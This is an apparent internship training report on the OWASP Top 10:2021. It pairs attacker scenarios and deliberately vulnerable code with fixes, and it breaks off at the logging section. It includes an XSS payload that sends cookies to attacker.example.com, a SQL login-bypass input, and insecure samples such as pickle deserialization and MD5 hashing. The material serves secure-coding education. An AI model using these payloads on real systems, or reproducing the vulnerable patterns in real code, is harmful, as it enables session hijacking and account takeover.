# OWASP Top 10 Web Application Security Risks
## Internship Assessment Report

**Prepared for:** Security Leadership Team
**Classification:** Internal — Training & Development Deliverable
**Framework Reference:** OWASP Top 10:2021

---

## Executive Summary

The Open Web Application Security Project (OWASP) Top 10 is the industry-standard awareness document for web application security, published and periodically revised by the OWASP Foundation based on aggregated vulnerability data contributed by security vendors and consulting firms across tens of thousands of applications. It is not a testing checklist in the formal sense, but a **risk categorization framework**: each of the ten entries represents a class of weakness, not a single CVE or a single test case, and each class can manifest through dozens of distinct technical root causes.

For an organization operating an Application Security (AppSec) or Penetration Testing function, the OWASP Top 10 serves three practical purposes:

1. **A common vocabulary** between engineering, security, and leadership when discussing risk (e.g., "this finding is an A03 Injection issue" communicates severity and remediation pattern instantly to anyone familiar with the framework).
2. **A minimum-bar checklist** for secure development — the categories represent the most prevalent and most exploited weakness classes, so an application that has *not* been assessed against all ten should be treated as unassessed from a baseline-risk perspective.
3. **A training curriculum** — because each category maps cleanly to a root cause (missing authorization check, unparameterized query, missing encryption, etc.), it is well suited for structured security education, which is the purpose of this internship deliverable.

This report documents an internship-cycle technical assessment covering all ten categories in the OWASP Top 10:2021 release. For each category, the report provides the technical mechanism of the flaw, its root cause and business impact, a realistic attacker workflow, a vulnerable code or configuration example paired with its secure remediation, and the relevant CWE (Common Weakness Enumeration) mapping used for standardized risk tracking. The report closes with cross-cutting recommendations for embedding these controls into the software development lifecycle (SDLC), and a sign-off summarizing the internship deliverable.

This document is intended as **original training and reference material** produced during the internship period. Code samples are illustrative (Python/Flask, Node/Express, PHP, SQL, and generic pseudocode where appropriate) rather than drawn from any single production or lab system, so the patterns generalize across technology stacks.

---

## Scope & Methodology

### Assessment Scope

This engagement scope covers **web application security posture** as defined by the OWASP Top 10:2021 categories, applied at three layers:

| Layer | What is examined |
|---|---|
| **Code level** | Source code patterns that introduce the flaw (unsafe string concatenation, missing validation, hardcoded secrets, insecure deserialization) |
| **Configuration level** | Server, framework, and infrastructure settings (HTTP security headers, TLS configuration, default credentials, verbose error handling, CORS policy) |
| **Architectural level** | Design-time decisions (trust boundaries, authorization models, session management strategy, dependency management, logging architecture) |

### Methodology

A layered methodology was used, consistent with standard AppSec practice:

1. **Threat modeling / attack surface mapping** — enumerating entry points (forms, API endpoints, file uploads, authentication flows, third-party integrations) before any active testing.
2. **Static analysis (SAST)** — source-level review and automated static scanning to catch injection points, hardcoded secrets, and insecure API usage before code reaches runtime.
3. **Dynamic analysis (DAST)** — runtime testing of the running application using an intercepting proxy (e.g., Burp Suite, OWASP ZAP) to manipulate requests, tamper with parameters, and observe application responses.
4. **Manual verification and exploitation** — automated scanners produce a high false-positive rate on authorization and business-logic flaws in particular, so every finding in this class of report should be manually confirmed with a proof-of-concept before being recorded as a verified finding.
5. **Risk rating** — each finding is scored using **CVSS v3.1** (Common Vulnerability Scoring System) to produce a consistent, comparable severity rating, and mapped to a **CWE ID** for taxonomic tracking and trend analysis across assessments.
6. **Remediation validation** — where possible, proposed fixes are re-tested to confirm the vulnerability class is closed, not just the specific proof-of-concept payload.

### Risk Rating Scale Used in This Report

| CVSS Range | Severity | Typical Response SLA |
|---|---|---|
| 9.0 – 10.0 | Critical | Immediate — halt release, patch within 24–48h |
| 7.0 – 8.9 | High | Patch within the current sprint / 7 days |
| 4.0 – 6.9 | Medium | Patch within the next release cycle / 30 days |
| 0.1 – 3.9 | Low | Backlog, address opportunistically |

---

## Detailed Findings & Vulnerability Analysis

The following section addresses each of the ten OWASP Top 10:2021 categories in ranked order. Each category is treated as a **class of vulnerability** rather than a single instance, per OWASP's own framing of the list.

### A01:2021 — Broken Access Control

**Technical Definition**
Broken Access Control occurs when an application fails to properly enforce restrictions on what authenticated (or unauthenticated) users are allowed to do. This includes both **horizontal privilege escalation** (User A accessing User B's resources at the same privilege level, e.g., another customer's order) and **vertical privilege escalation** (a standard user reaching admin-only functionality). The flaw typically arises when authorization checks are performed only in the client (hidden UI elements) or are missing entirely on the server for a specific object/action combination — commonly referred to as an **IDOR (Insecure Direct Object Reference)** when the missing check is on an object identifier such as a user ID, order ID, or file path.

**Root Cause & Impact**
Root cause is almost always a missing or incorrectly-scoped **server-side authorization check** — the server trusts that a client will only ever request its own data, or trusts a client-supplied identifier (`user_id`, `account_id`) without validating it against the authenticated session. Impact ranges from unauthorized data disclosure (viewing other users' PII, orders, medical records) to full account takeover or unauthorized state changes (modifying another user's cart, deleting another user's data, escalating to administrative functions). This is consistently the #1 category in OWASP's data-driven ranking because it is architecturally easy to miss and difficult to catch with automated scanners, which cannot infer "this object belongs to a different user" without business-logic context.

**Real-World Attack Scenario**
1. Attacker registers a normal account and logs in, receiving session token/cookie for `user_id=1042`.
2. Attacker browses to their own order history: `GET /api/orders/1042` — succeeds as expected.
3. Attacker intercepts the request with a proxy and decrements the ID: `GET /api/orders/1041`.
4. The server returns another customer's full order record (name, address, items, payment last-4) because it only checks that *a* valid session exists, not that the session owner matches the requested `order_id`.
5. Attacker scripts the request across a range of IDs to enumerate the entire order database — a mass data breach achieved with zero exploitation complexity beyond incrementing an integer.

**Vulnerable Code Example**
```python
# Flask — vulnerable: no ownership check
@app.route("/api/orders/<int:order_id>")
@login_required
def get_order(order_id):
    order = db.session.query(Order).filter_by(id=order_id).first()
    return jsonify(order.to_dict())   # returns ANY order, regardless of owner
```

**Remediation & Secure Coding Practice**
```python
# Flask — remediated: enforce ownership at the query level
@app.route("/api/orders/<int:order_id>")
@login_required
def get_order(order_id):
    order = db.session.query(Order).filter_by(
        id=order_id,
        owner_id=current_user.id          # scope the query to the session owner
    ).first()
    if order is None:
        abort(404)                        # 404, not 403 — avoid confirming existence
    return jsonify(order.to_dict())
```
- Enforce **deny-by-default** access control: every endpoint denies access unless a rule explicitly grants it.
- Implement authorization checks **centrally** (middleware, decorators, or a policy engine such as OPA) rather than duplicating checks in every handler — duplication is where checks get forgotten.
- Never rely on client-side hiding of buttons/menus as an access control mechanism.
- Use indirect, non-sequential, or per-user object references (e.g., UUIDs, or a signed reference token) so that IDs cannot be trivially enumerated even if a check is missed.
- Log and alert on repeated authorization failures (a signal of enumeration attempts), and rate-limit high-value endpoints.

**CWE Mapping:** CWE-284 (Improper Access Control), CWE-639 (Authorization Bypass Through User-Controlled Key)

| Attribute | Rating |
|---|---|
| Typical CVSS | 6.5–8.1 (Medium–High), higher if write access or PII is exposed |
| Exploitability | Low complexity, no special tooling required |
| Prevalence | Highest of all categories in OWASP's 2021 dataset |

### A02:2021 — Cryptographic Failures

**Technical Definition**
Cryptographic Failures (formerly "Sensitive Data Exposure") cover any weakness that leads to exposure of sensitive data — credentials, PII, financial data, session tokens, health records — through the absence of encryption, use of weak/deprecated algorithms, improper key management, or transmission over unencrypted channels. This category was renamed in the 2021 revision specifically to shift focus from the *symptom* (data exposure) to the *root cause* (failures in how cryptography is applied).

**Root Cause & Impact**
Root causes include: transmitting sensitive data over plain HTTP instead of TLS; storing passwords with fast general-purpose hashes (MD5, SHA-1, or even unsalted SHA-256) instead of a slow, salted, purpose-built KDF (bcrypt, scrypt, Argon2); using weak or hardcoded encryption keys committed to source control; disabling certificate validation "temporarily" for testing and shipping it; and storing sensitive data that does not need to be retained at all. Impact is direct and severe: a database breach that would otherwise expose only opaque hashes instead exposes plaintext-equivalent credentials, enabling credential-stuffing attacks against every other service the same users reused that password on.

**Real-World Attack Scenario**
1. Attacker gains read access to a database backup (via a separate misconfiguration, insider threat, or SQL injection elsewhere in the stack).
2. The `users` table stores passwords as unsalted MD5 hashes.
3. Attacker loads the hash dump into a GPU-accelerated cracking tool (e.g., hashcat) against a precomputed rainbow table or wordlist — unsalted MD5 can be cracked at billions of hashes per second and rainbow tables exist for the entire common-password space.
4. Within hours, the majority of user passwords are recovered in plaintext.
5. Attacker uses the recovered credentials in **credential-stuffing** attacks against unrelated high-value services (banking, email) where users reused the same password, because the original service's weak hashing choice has now compromised accounts the attacker never directly targeted.

**Vulnerable Code Example**
```python
# Vulnerable: fast hash, no salt, no work factor
import hashlib

def store_password(password: str) -> str:
    return hashlib.md5(password.encode()).hexdigest()
```
```
# Vulnerable configuration: TLS disabled / cert validation off
requests.get("https://api.internal.example.com/data", verify=False)
```

**Remediation & Secure Coding Practice**
```python
# Remediated: bcrypt — salted, adaptive work factor
import bcrypt

def store_password(password: str) -> bytes:
    return bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))

def verify_password(password: str, stored_hash: bytes) -> bool:
    return bcrypt.checkpw(password.encode(), stored_hash)
```
- Encrypt sensitive data **in transit** (enforce TLS 1.2+ everywhere, HSTS header, no mixed content) and **at rest** (AES-256-GCM for data-at-rest, with keys managed by a dedicated KMS/HSM, never hardcoded or committed to a repository).
- Use a purpose-built password hashing algorithm (bcrypt, scrypt, or Argon2id) — never a general-purpose fast hash (MD5, SHA-1, SHA-256) for password storage.
- Classify data and apply the principle of **minimization**: don't collect or retain sensitive data you don't need (e.g., don't store full card numbers if a tokenized reference from the payment processor suffices).
- Rotate keys and secrets on a defined schedule, and never embed secrets in source code — use a secrets manager (Vault, AWS Secrets Manager, Azure Key Vault).
- Disable weak TLS/SSL protocol versions and cipher suites at the load balancer/web server level.

**CWE Mapping:** CWE-326 (Inadequate Encryption Strength), CWE-327 (Use of a Broken or Risky Cryptographic Algorithm), CWE-311 (Missing Encryption of Sensitive Data)

| Attribute | Rating |
|---|---|
| Typical CVSS | 7.5–9.1 (High–Critical) when credentials or financial data are involved |
| Exploitability | Low once data is obtained; offline cracking is trivial for weak hashes |
| Prevalence | Very common in legacy systems and rushed MVPs |

### A03:2021 — Injection

**Technical Definition**
Injection flaws occur when untrusted input is concatenated directly into an interpreter's command or query string — SQL, NoSQL, OS shell commands, LDAP queries, or XPath expressions — allowing the attacker-supplied data to be interpreted as **code/control syntax** rather than **data**. Cross-Site Scripting (XSS) is now formally folded into this category in the 2021 revision, as it is fundamentally the same root cause applied to the browser's HTML/JS interpreter rather than a database.

**Root Cause & Impact**
The root cause is the absence of a strict boundary between the "data" channel and the "control" channel when constructing a query or command — typically achieved via naive string concatenation or f-strings/template literals instead of parameterized APIs. Impact for SQL injection specifically can be catastrophic: full database read/write access, authentication bypass, and in some database configurations (e.g., MySQL with `FILE` privilege, or MSSQL `xp_cmdshell`), remote code execution on the underlying host. For XSS, impact includes session hijacking via cookie theft, credential phishing via DOM manipulation, and drive-by malware delivery to every visitor of the affected page.

**Real-World Attack Scenario — SQL Injection (Authentication Bypass)**
1. Attacker locates a login form that builds its query via string concatenation.
2. Attacker submits username: `admin' -- ` and any password value.
3. The resulting query becomes `SELECT * FROM users WHERE username='admin' -- ' AND password='...'` — the `--` comments out the password check entirely.
4. The application authenticates the attacker as `admin` with no valid credentials.
5. Attacker escalates by using a `UNION SELECT` injection in a search field to exfiltrate the entire `users` table, including password hashes, through the application's own search results display.

**Real-World Attack Scenario — Stored XSS**
1. Attacker submits a product review containing `<script>fetch('https://attacker.example.com/c?c='+document.cookie)</script>` on a review field that is rendered without encoding.
2. The payload is stored in the database and rendered, unescaped, to every subsequent visitor of that product page.
3. Each visitor's browser silently executes the script, exfiltrating their session cookie to the attacker's server.
4. Attacker replays the stolen session cookies to hijack active user sessions without needing any password.

**Vulnerable Code Example**
```python
# SQL Injection — string concatenation
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
cursor.execute(query)
```
```javascript
// Stored XSS — unescaped output
element.innerHTML = userSuppliedReviewText;
```

**Remediation & Secure Coding Practice**
```python
# Remediated — parameterized query, never string-built
query = "SELECT * FROM users WHERE username = %s AND password_hash = %s"
cursor.execute(query, (username, hash_password(password)))
```
```javascript
// Remediated — safe text insertion, framework auto-escaping
element.textContent = userSuppliedReviewText;
// Or, in a framework: React/Vue/Angular auto-escape by default —
// avoid dangerouslySetInnerHTML / v-html unless content is sanitized (e.g., DOMPurify)
```
- Use **parameterized queries / prepared statements** or an ORM's query builder for all database access — never concatenate untrusted input into SQL, NoSQL, or shell commands.
- Apply **contextual output encoding** for anything rendered into HTML, JavaScript, URL, or CSS contexts; rely on the templating framework's default auto-escaping rather than manually building markup strings.
- Implement a strict **Content-Security-Policy** header (`script-src 'self'`) as a defense-in-depth layer that blocks inline script execution even if an XSS payload slips through.
- Apply **allow-list input validation** at the boundary (expected format, length, character set) in addition to output encoding — validation alone is not sufficient defense against injection, but reduces attack surface.
- Use least-privilege database accounts for the application (no `DROP`, `FILE`, or admin grants on the application's runtime DB user).

**CWE Mapping:** CWE-89 (SQL Injection), CWE-79 (Cross-Site Scripting), CWE-78 (OS Command Injection)

| Attribute | Rating |
|---|---|
| Typical CVSS | 8.0–9.8 (High–Critical) for SQLi with data access; 5.0–7.0 (Medium–High) for reflected/stored XSS depending on impact |
| Exploitability | Low complexity — extensively tooled (sqlmap, Burp Scanner) |
| Prevalence | Declining in modern frameworks with safe defaults, still common in legacy and hand-rolled query code |

### A04:2021 — Insecure Design

**Technical Definition**
Insecure Design is a new 2021 category distinct from *implementation* bugs — it addresses flaws baked into the application's **architecture and business logic** before a single line of code is written. A perfectly-implemented feature can still be insecure if the underlying design never accounted for abuse cases (e.g., a password-reset flow with no rate limiting by design, or a discount-code system with no business-logic limit on redemption count).

**Root Cause & Impact**
Root cause is the absence of **threat modeling** and **secure design patterns** during the requirements and architecture phase — security is treated as a code-review checklist item rather than a design constraint. Impact varies widely by the specific business logic involved, but commonly includes financial loss (abuse of pricing/discount logic), account takeover (weak-by-design recovery flows), and resource exhaustion (missing rate limits by design, not by accident).

**Real-World Attack Scenario**
1. An e-commerce platform's checkout allows entering a quantity field with no server-side lower-bound validation, because the design assumed the UI's minimum-quantity spinner control would always be respected.
2. Attacker intercepts the checkout request and sets quantity to `-5` for a high-value item.
3. The total-price calculation (`unit_price * quantity`) legitimately computes a negative total.
4. The payment/wallet integration processes the negative total as a **credit to the attacker's account** rather than a charge, because refund/credit logic was never designed to distinguish "returning a negative-price purchase" from "processing a normal refund."
5. Attacker repeats the transaction to drain the platform's wallet balance — a pure business-logic exploit that no amount of secure *coding* prevents, because the flaw is in the *design* (no business rule stating "quantity and computed total must be positive integers").

**Vulnerable Design Pattern**
```
Design assumption (undocumented, untested):
"Quantity will always be >= 1 because the UI enforces it."

Consequence: server-side logic has no independent invariant check —
the trust boundary between client and server was never modeled.
```

**Remediation & Secure Coding Practice**
```python
# Remediated — business invariant enforced server-side, independent of UI
def calculate_total(unit_price: Decimal, quantity: int) -> Decimal:
    if quantity < 1 or quantity > MAX_QTY_PER_ORDER:
        raise InvalidOrderError("Quantity must be a positive integer within allowed limits")
    total = unit_price * quantity
    if total <= 0:
        raise InvalidOrderError("Computed total must be positive")
    return total
```
- Adopt **threat modeling** (e.g., STRIDE) as a mandatory step during design/architecture review, before implementation begins — identify abuse cases, not just intended-use cases.
- Define and enforce **business logic invariants** server-side (minimum/maximum quantities, rate limits, sequential-workflow enforcement) independent of any client-side control.
- Use **secure design patterns** as defaults: fail-secure error handling, segregation of tiers/trust zones, and limiting resource consumption per user/session.
- Maintain a library of vetted, reusable secure components (auth, payment, file handling) so teams are not re-solving hard security problems ad hoc in every feature.
- Conduct design-phase security reviews for any feature that touches money, authentication, or access control before it reaches implementation.

**CWE Mapping:** CWE-841 (Improper Enforcement of Behavioral Workflow), CWE-840 (Business Logic Errors)

| Attribute | Rating |
|---|---|
| Typical CVSS | Highly variable — 4.0–9.0 depending on business impact |
| Exploitability | Often low complexity, but requires business-context understanding — poorly caught by automated scanners |
| Prevalence | Under-reported historically because it requires manual, context-aware testing to find |

### A05:2021 — Security Misconfiguration

**Technical Definition**
Security Misconfiguration covers any gap between an application/infrastructure's **actual** configuration and its **secure baseline** — unnecessary features enabled, default credentials left in place, verbose error messages leaking stack traces, missing security headers, overly permissive CORS policies, or cloud storage buckets left publicly accessible. Unlike a code-level bug, misconfiguration flaws exist purely in *settings*, which makes them common because they require ongoing operational discipline rather than a one-time code fix.

**Root Cause & Impact**
Root causes include: shipping development/debug settings to production (verbose stack traces, debug consoles like Werkzeug's interactive debugger, or Django's `DEBUG=True`); leaving default admin credentials unchanged on infrastructure components; missing HTTP security headers; and overly permissive cloud IAM policies or storage bucket ACLs. Impact ranges from information disclosure (stack traces revealing internal file paths, library versions, and database schema) to full remote code execution — a Flask/Django debug console left enabled in production, for instance, allows arbitrary Python execution directly through the error page.

**Real-World Attack Scenario**
1. Attacker triggers a server error on a production endpoint (e.g., malformed input causing an unhandled exception).
2. The application, still running with `DEBUG=True`, returns a full interactive debugger page (Werkzeug/Django) instead of a generic error message.
3. This debugger exposes a PIN-protected but often-guessable or brute-forceable console that allows arbitrary Python code execution directly in the browser.
4. Attacker uses the console to read environment variables (often containing database credentials and API keys) and, ultimately, achieves remote code execution on the host.
5. Separately, the same organization's S3 bucket used for static assets is discovered to have `List` and `Read` permissions open to "Authenticated Users" (interpreted by AWS as *any AWS account*, not just the organization's own users), exposing internal build artifacts and configuration backups to anyone with an AWS account.

**Vulnerable Configuration Example**
```python
# Flask — vulnerable production configuration
app.config['DEBUG'] = True   # exposes interactive debugger + full stack traces
```
```
# Vulnerable HTTP response headers (missing hardening)
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/7.2.3
# No Content-Security-Policy, X-Frame-Options, or Strict-Transport-Security
```

**Remediation & Secure Coding Practice**
```python
# Remediated — debug disabled, generic error handling in production
app.config['DEBUG'] = False

@app.errorhandler(500)
def internal_error(e):
    log.exception("Unhandled exception")   # detail goes to server-side logs only
    return jsonify({"error": "An internal error occurred"}), 500
```
```
# Remediated — hardened security headers
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
Content-Security-Policy: default-src 'self'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: strict-origin-when-cross-origin
Server: (suppressed / generic value)
```
- Maintain a **repeatable, automated hardening baseline** (infrastructure-as-code, configuration-as-code) rather than manual server setup, so every environment is provisioned identically and auditable.
- Disable and remove unnecessary features, sample applications, default accounts, and verbose framework debug modes before any production deployment.
- Enforce standard security headers (CSP, HSTS, X-Content-Type-Options, X-Frame-Options, Referrer-Policy) at the web server/gateway layer as a fleet-wide default.
- Run periodic automated configuration audits (cloud security posture management tooling, CIS Benchmark scans) against all environments, not just at initial deployment.
- Segment environments so that no development/debug configuration can ever reach the production network by accident (separate credentials, separate deployment pipelines).

**CWE Mapping:** CWE-16 (Configuration), CWE-2 (Environmental Security Flaws), CWE-209 (Information Exposure Through an Error Message)

| Attribute | Rating |
|---|---|
| Typical CVSS | 5.3–9.8, depending on whether the misconfiguration yields RCE (debug consoles) or information disclosure |
| Exploitability | Frequently trivial — no custom exploit development required |
| Prevalence | Very common; increases with infrastructure complexity and multi-cloud sprawl |

### A06:2021 — Vulnerable and Outdated Components

**Technical Definition**
This category covers risk introduced by using third-party libraries, frameworks, and runtime components (npm packages, Python packages, OS-level libraries, container base images) that contain known vulnerabilities, are unsupported/end-of-life, or are pulled from unverified sources without integrity checking. Modern applications are assembled from dozens to hundreds of transitive dependencies, and the application's own code is often a small fraction of its total attack surface.

**Root Cause & Impact**
Root cause is the absence of a disciplined **software composition management** process: no dependency inventory, no automated vulnerability scanning of dependencies, no patch cadence, and no visibility into *transitive* dependencies (a dependency of a dependency). Impact is bounded only by what the vulnerable component itself can do — a vulnerable deserialization library can yield remote code execution; a vulnerable logging library can yield RCE via crafted log input (as demonstrated at internet scale by the Log4Shell vulnerability in Log4j); a vulnerable image-processing library can yield server-side request forgery or memory corruption.

**Real-World Attack Scenario**
1. Attacker fingerprints the target application's technology stack via response headers, JS bundle contents, and error messages, identifying a specific outdated library version.
2. Attacker cross-references the version against public vulnerability databases (NVD, GitHub Advisory Database) and finds a published CVE with a known, weaponized exploit for that exact version — for example, an outdated deserialization library with a documented remote code execution gadget chain.
3. Attacker sends a single crafted request containing the malicious serialized payload to any endpoint that deserializes user-controllable input using the vulnerable library.
4. The deserialization process executes attacker-controlled code on the server before any application-level authentication or authorization check ever runs, because the vulnerability exists below the application logic layer.
5. Attacker achieves full remote code execution and pivots to internal network reconnaissance — a compromise that required zero custom exploit development, only knowledge of the outdated component's version number.

**Vulnerable Configuration Example**
```json
// package.json — pinned to a known-vulnerable major version, never updated
{
  "dependencies": {
    "lodash": "4.17.4",
    "log4js": "2.3.0"
  }
}
```
```
# No automated dependency scanning in CI pipeline
# No Software Bill of Materials (SBOM) generated
# No alerting on newly disclosed CVEs affecting in-use packages
```

**Remediation & Secure Coding Practice**
```yaml
# Remediated — CI pipeline step enforcing dependency scanning
- name: Dependency Vulnerability Scan
  run: |
    npm audit --audit-level=high
    # or: pip-audit / safety check for Python
    # or: trivy fs . / grype for container images and SBOMs
  # Pipeline fails the build on any High/Critical finding
```
- Maintain an accurate, automated **inventory of all dependencies**, including transitive ones — generate a Software Bill of Materials (SBOM) as part of the build process.
- Integrate automated vulnerability scanning (`npm audit`, `pip-audit`, Snyk, Dependabot, Trivy, Grype) into CI/CD, gating merges/deploys on High and Critical findings.
- Subscribe to security advisories for all core frameworks and critical dependencies, and establish a **patch SLA** proportional to severity (e.g., Critical CVEs patched within 48–72 hours).
- Remove unused dependencies and features to reduce the total attack surface — the safest vulnerable component is the one that was never included.
- Only pull dependencies from official, verified package registries, and verify package integrity (checksums/signatures) where supported.

**CWE Mapping:** CWE-1104 (Use of Unmaintained Third Party Components), CWE-937 (Using Components with Known Vulnerabilities)

| Attribute | Rating |
|---|---|
| Typical CVSS | Inherited directly from the underlying component's CVE — can reach 10.0 (Critical) |
| Exploitability | Often very low complexity — public exploit code frequently available for known CVEs |
| Prevalence | Extremely common given the scale of modern dependency trees |

### A07:2021 — Identification and Authentication Failures

**Technical Definition**
This category (formerly "Broken Authentication") covers weaknesses in how an application confirms user identity and maintains session state: permitting weak or default passwords, lacking protection against credential stuffing and brute-force attacks, exposing session identifiers in URLs, failing to invalidate sessions on logout or after a defined idle period, and missing or poorly-implemented multi-factor authentication (MFA).

**Root Cause & Impact**
Root causes include the absence of rate limiting/account lockout on login endpoints, weak password policy enforcement, session tokens that are predictable or that fail to rotate after privilege changes (e.g., after login, a pre-authentication session ID is reused post-authentication — **session fixation**), and long-lived or non-expiring session tokens. Impact is direct account takeover, which is typically the highest-value outcome for an attacker because it inherits whatever privileges and data access the compromised account already has.

**Real-World Attack Scenario — Credential Stuffing**
1. Attacker obtains a large breach-derived list of email/password pairs from an unrelated prior breach (via dark-web marketplaces or public dumps).
2. Attacker scripts automated login attempts against the target application's login endpoint using the breached credential pairs, at high volume, because the login endpoint has no rate limiting, CAPTCHA, or account lockout.
3. A percentage of users (historically 0.1–2% in documented credential-stuffing campaigns) reused the same password on this application as on the breached service.
4. Attacker's automation flags the successful logins and begins systematically taking over those accounts.
5. Because the application has no anomaly detection (new-device/new-geography login without notification), account owners have no immediate signal that a takeover has occurred.

**Real-World Attack Scenario — Session Fixation**
1. Attacker visits the target site pre-authentication and obtains a valid but unauthenticated session ID (e.g., `SESSIONID=abc123`).
2. Attacker sends the victim a phishing link that pre-sets this same session ID in the victim's browser (via a URL parameter the application improperly accepts, or a subdomain-scoped cookie).
3. Victim logs in normally; because the application does not **regenerate** the session ID upon successful authentication, the session `abc123` is now authenticated **as the victim**.
4. Attacker, already holding `abc123`, is now also authenticated as the victim in a separate browser session — full account access without ever obtaining the victim's password.

**Vulnerable Code Example**
```python
# Vulnerable — no rate limiting, no lockout, session ID unchanged after login
@app.route("/login", methods=["POST"])
def login():
    user = authenticate(request.form["username"], request.form["password"])
    if user:
        session["user_id"] = user.id   # reuses existing pre-auth session ID
        return redirect("/dashboard")
    return "Invalid credentials", 401
```

**Remediation & Secure Coding Practice**
```python
# Remediated — rate limiting, lockout, and session regeneration on login
@limiter.limit("5 per minute")
@app.route("/login", methods=["POST"])
def login():
    username = request.form["username"]
    if is_locked_out(username):
        return "Account temporarily locked", 429

    user = authenticate(username, request.form["password"])
    if user:
        record_login_success(username)
        session.clear()                 # invalidate any pre-auth session data
        session.regenerate()            # issue a brand-new session ID post-auth
        session["user_id"] = user.id
        return redirect("/dashboard")

    record_login_failure(username)      # feeds lockout threshold
    return "Invalid credentials", 401
```
- Enforce **rate limiting and progressive account lockout** (or CAPTCHA challenge) on authentication endpoints to blunt automated credential stuffing and brute-force attacks.
- Regenerate the session identifier immediately upon successful authentication and any privilege change, and enforce absolute and idle session timeouts.
- Require **multi-factor authentication (MFA)**, particularly for privileged/administrative accounts, and offer it to all users.
- Check submitted passwords against known-breached password lists (e.g., via the Have I Been Pwned Passwords API) at registration and password-change time, in addition to complexity rules.
- Use secure, `HttpOnly`, `Secure`, and `SameSite=Strict` (or `Lax`) attributes on session cookies, and never transmit session identifiers in URL query strings.

**CWE Mapping:** CWE-287 (Improper Authentication), CWE-384 (Session Fixation), CWE-307 (Improper Restriction of Excessive Authentication Attempts)

| Attribute | Rating |
|---|---|
| Typical CVSS | 7.5–9.8 (High–Critical) given direct account-takeover impact |
| Exploitability | Low complexity, heavily automatable |
| Prevalence | Very common, especially credential stuffing given the scale of prior public breaches |

### A08:2021 — Software and Data Integrity Failures

**Technical Definition**
This category, new in 2021, addresses failures to verify the **integrity** of software updates, critical data, and CI/CD pipelines before trusting or executing them. It includes insecure deserialization (making a comeback here rather than as its own 2017 category), auto-update mechanisms that fetch and apply code without signature verification, and CI/CD pipelines with insufficient access controls that allow unauthorized code to enter the build/release process.

**Root Cause & Impact**
Root cause is trusting data or code from a source (a serialized object, an update package, a build artifact) **without cryptographically verifying it has not been tampered with**. Impact for insecure deserialization is typically remote code execution, since many serialization formats (Java's native serialization, Python's `pickle`) allow object reconstruction to trigger arbitrary method calls as a side effect of deserializing attacker-controlled data. Impact for CI/CD pipeline integrity failures is supply-chain compromise — malicious code inserted at the build stage is trusted and distributed to every downstream consumer of that software, as demonstrated by high-profile real-world supply-chain attacks (e.g., SolarWinds).

**Real-World Attack Scenario**
1. Attacker identifies an API endpoint that accepts a serialized object (Python `pickle`, Java `ObjectInputStream`, PHP `unserialize()`) from user input — for example, a "remember me" cookie storing a pickled user-preferences object.
2. Attacker crafts a malicious serialized payload containing a **gadget chain**: a sequence of legitimate class method calls, present in existing libraries on the target, that when triggered in sequence during deserialization result in execution of an attacker-chosen OS command.
3. Attacker submits the crafted payload as the "remember me" cookie value.
4. The server deserializes the cookie to reconstruct the object, and in doing so, unintentionally executes the gadget chain, running the attacker's command with the privileges of the application process.
5. Separately, in a CI/CD integrity failure: an attacker with write access to a low-privilege internal repository injects a malicious build step into a shared pipeline template, which is then inherited by dozens of downstream production pipelines that trust the template without independent code review — a single compromised template becomes a fleet-wide backdoor.

**Vulnerable Code Example**
```python
# Vulnerable — deserializing untrusted user input with pickle
import pickle

@app.route("/preferences")
def load_preferences():
    raw = request.cookies.get("prefs")
    prefs = pickle.loads(base64.b64decode(raw))   # executes arbitrary code on load
    return render_template("prefs.html", prefs=prefs)
```

**Remediation & Secure Coding Practice**
```python
# Remediated — use a data-only serialization format, never a code-executing one
import json

@app.route("/preferences")
def load_preferences():
    raw = request.cookies.get("prefs")
    prefs = json.loads(base64.b64decode(raw))     # pure data, no method execution
    validate_preferences_schema(prefs)            # explicit schema validation
    return render_template("prefs.html", prefs=prefs)
```
- Never deserialize untrusted input using formats capable of arbitrary object/method reconstruction (Python `pickle`, Java native serialization, PHP `unserialize`) — use data-only formats (JSON, Protocol Buffers) with explicit schema validation instead.
- Verify **digital signatures and checksums** on all software updates and build artifacts before applying or executing them.
- Enforce branch protection, mandatory code review, and least-privilege access controls on all CI/CD pipeline configuration — treat pipeline definitions with the same scrutiny as production code, since they have production-equivalent reach.
- Generate and verify a Software Bill of Materials (SBOM) at build time to establish a trusted, auditable provenance chain for every release artifact.
- Isolate and sandbox any process that must handle deserialization of external data, limiting the blast radius if a gadget chain is successfully triggered.

**CWE Mapping:** CWE-502 (Deserialization of Untrusted Data), CWE-494 (Download of Code Without Integrity Check)

| Attribute | Rating |
|---|---|
| Typical CVSS | 8.1–9.8 (High–Critical), frequently yields direct RCE |
| Exploitability | Medium complexity — requires knowledge of available gadget chains in the target's libraries |
| Prevalence | Growing concern, particularly around software supply-chain and CI/CD attack surface |

### A09:2021 — Security Logging and Monitoring Failures

**Technical Definition**
This category covers the absence, insufficiency, or mishandling of logging and monitoring capabilities needed to **detect, escalate, and respond to** active attacks. Unlike the other nine categories, this one does not itself grant an attacker initial access — its impact is entirely about how long an attacker, once inside, remains undetected, and how effectively the organization can investigate and respond after the fact.

**Root Cause & Impact**
Root causes include: not logging security-relevant events (failed logins, access-control failures, input validation failures, high-value transactions); logs that are generated but never reviewed or alerted on; logs stored only locally on the compromised host (allowing an attacker to delete evidence of their own activity); and logging sensitive data (passwords, full session tokens, PII) in plaintext, which turns the logging system itself into a data-exposure risk. Documented industry breach data consistently shows median attacker dwell time — the time between initial compromise and detection — measured in **weeks to months** where logging and monitoring are inadequate, during which an attacker has ample time to escalate privileges, exfiltrate data, and establish persistence.

**Real-World Attack Scenario**
1. Attacker performs a slow, low-and-slow credential-stuffing campaign against the login endpoint, deliberately staying under any simplistic per-minute rate-limit threshold.
2. Because failed login attempts are not logged with sufficient detail (no source IP, no username, no timestamp correlation) and no alerting rule exists for anomalous failure volume, the campaign runs undetected for weeks.
3. Attacker eventually succeeds on a handful of accounts and begins exfiltrating data in small batches, again staying under any naive volume-based detection threshold.
4. Because logs are stored only on the application server itself (no centralized, immutable log aggregation), when the attacker later escalates privileges and gains shell access, they delete the local log files, destroying the only record of the initial compromise.
5. The breach is only discovered months later when stolen data appears for sale, and the incident response team has no forensic trail to reconstruct the attacker's initial entry point, full scope of access, or exfiltrated data — turning what could have been a contained incident into an open-ended, high-uncertainty breach investigation.

**Vulnerable Configuration Example**
```python
